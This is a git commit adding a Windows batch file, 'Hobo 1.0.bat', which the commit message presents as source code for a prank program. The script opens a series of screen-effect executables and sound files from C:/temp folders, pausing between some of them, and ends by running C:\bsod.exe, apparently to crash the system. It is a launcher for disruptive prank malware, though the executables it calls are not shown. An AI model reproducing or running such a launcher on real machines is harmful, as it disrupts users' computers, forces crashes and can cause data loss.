87a84a8fe14875145b09af621812ff3da4d21aad
Nestor5 <108619530+Nestor5Cat@users.noreply.github.com>
2022-07-05 22:24:42 +0300

    Belloa.exe source code but Hobo.exe 1.0

---
+++ Hobo 1.0.bat
@@ -0,0 +1,33 @@
+start cmd
+start C:/temp/crazysound/crazysound1.wav
+start C:/temp/Phosgene/circle.exe
+start C:/temp/crazysound/crazysound2.wav
+start C:/temp/Phosgene/tunnel.exe
+start C:/temp/crazysound/crazysound3.wav
+start C:/temp/Phosgene/ALast.exe
+start C:/temp/crazysound/crazysound4.wav
+start C:/temp/Phosgene/linedraw.exe
+start C:/temp/crazysound/crazysound5.wav
+start C:/temp/Phosgene/invmelter.exe
+start C:/temp/crazysound/crazysound6.wav
+start C:/temp/Phosgene/sinewaves.exe
+start C:/temp/crazysound/crazysound7.wav
+start C:/temp/Phosgene/rgb.exe
+pause
+start /C:/temp/Phosgene/PatBlt.exe
+pause
+start C:/temp/Phosgene/1.exe
+pause
+start C:/temp/Phosgene/AWave.exe
+pause
+start C:/temp/Phosgene/ATohou.exe
+pause
+start C:/temp/Phosgene/BitBlt1.exe
+pause
+start C:/temp/DETCEFNINIW/ColorA.exe
+pause
+start C:/temp/DETCEFNINIW/w1.exe
+pause
+start C:/temp/DETCEFNINIW/inv.exe
+pause
+start C:\bsod.exe
